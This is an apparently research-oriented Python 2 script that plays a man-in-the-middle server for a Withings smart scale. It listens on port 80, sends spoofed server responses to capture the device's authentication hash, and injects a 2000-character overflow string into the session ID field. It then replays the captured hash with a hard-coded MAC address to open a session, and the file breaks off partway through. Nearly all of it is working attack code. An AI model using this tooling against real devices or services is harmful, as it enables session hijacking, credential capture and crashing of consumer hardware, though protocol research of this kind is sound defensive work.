#
# I forget what this is really supposed to be.  I started hard-coding certain
# things later on in the project and the script lost its original meaning.
#
# Consider this reference code for spoofing the beginning stages of
# client-server session stuff.
#

import json
import socket
import sys
import urllib
import urllib2
from urlgrabber.keepalive import HTTPHandler

HOST = "0.0.0.0"
PORT = 80

response = "HTTP/1.1 200 OK\r\nDate: Tue, 19 Mar 2013 22:12:25 GMT\r\nServer: Apache\r\nX-Powered-By: PHP/5.3.10-1ubuntu3.2\r\nX-WI-SRV: FR-EQX-WEB-10\r\nAccess-Control-Allow-Origin: *\r\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\r\nAccess-Control-Allow-Credentials: true\r\nAccess-Control-Allow-Headers: Content-Type, *\r\nVary: Accept-Encoding\r\nContent-Length: 48\r\nContent-Type: text/plain\r\n\r\n{\"status\":0,\"body\":{\"once\":\"%s\"}}"

fuzz = "A" * 2000

content = "{\"status\":0,\"body\":{\"sessionid\":\"%s\",\"sp\":{\"users\":[]},\"ind\":{\"lg\":\"en_GB\",\"imt\":1,\"stp\":1,\"f\":0,\"g\":97918},\"syp\":{\"blc\":\"http:\\/\\/fw.withings.net\\/wbs03_211.bin\",\"utc\":1363749997},\"ctp\":{\"goff\":-14400,\"dst\":0,\"ngoff\":0}}}" % fuzz

fw = "HTTP/1.1 200 OK\r\nDate: Wed, 20 Mar 2013 03:26:37 GMT\r\nServer: Apache\r\nX-WI-SRV: FR-EQX-WEB-09\r\nAccess-Control-Allow-Origin: *\r\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\r\nAccess-Control-Allow-Credentials: true\r\nAccess-Control-Allow-Headers: Content-Type, *\r\nVary: Accept-Encoding\r\nTransfer-Encoding: chunked\r\nContent-Type: text/plain\r\n\r\nf2\r\n{\"status\":0,\"body\":{\"sessionid\":\"6256-51492c6d-5483c37e\",\"sp\":{\"users\":[]},\"ind\":{\"lg\":\"en_GB\",\"imt\":1,\"stp\":1,\"f\":0,\"g\":97918},\"syp\":{\"blc\":\"http:\\/\\/fw.withings.net\\/wbs03_211.bin\",\"utc\":1363749997},\"ctp\":{\"goff\":-14400,\"dst\":0,\"ngoff\":0}}}\r\n0\r\n\r\n"

def craft_params(params):
    return urllib.unquote(urllib.urlencode(params))

headers = [
    ("User-Agent", "Withings UserAgent"),
    ("Accept", "*/*"),
]

def do_request(opener, url, data):
    req = urllib2.Request(url, data)
    opener.addheaders = headers
    return opener.open(req).read()

def get_hash(s):
    while True:
        conn, addr = s.accept()

        print "Received connection from %s:%d" % addr

        while True:
            res = conn.recv(1024)
            print "RECEIVED:", res
            if not res:
                break
            if "action=get" in res:
                conn.send(response % nonce)
                print "SENT:", response % nonce

                res = conn.recv(1024)
                print "RECEIVED:", res
                index = res.index("hash=")
                hashvar = res[index+5:index+5+32]
                print "got hash, hash=%s" % hashvar

                conn.send(fw)
                print "SENT:", fw

                res = conn.recv(1024)
                print "RECEIVED:", res
                return hashvar

urlbase  = "http://scalews.withings.net/cgi-bin/"
urlonce  = urlbase + "once"
urlsess  = urlbase + "session"
urlmaint = urlbase + "maint"
urlassoc = urlbase + "association"

opener = urllib2.build_opener(HTTPHandler()) # Keep-alive

##
# Step 1
# MITM -> Server: /cgi-bin/once
##
'''
params = {
    "action": "get"
}

data = craft_params(params)

res = do_request(opener, urlonce, data)
print res

data = json.loads(res)
nonce = data["body"]["once"]
'''

nonce = "00d0177b-1360777c"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)

hashvar = get_hash(s)

sys.exit(0)

# Step 2: /cgi-bin/session
##

params = {
    "action": "new",
    "auth": "00:24:e4:06:59:dc",
    "hash": hashvar,
    "mfgid": "262151",
    "currentfw": "200",
    "batterylvl": "69",
    "duration": "30",
    "zreboot": "1"
}

data = craft_params(params)

print do_request(opener, urlsess, data)

##
# Step 3: /cgi-bin/

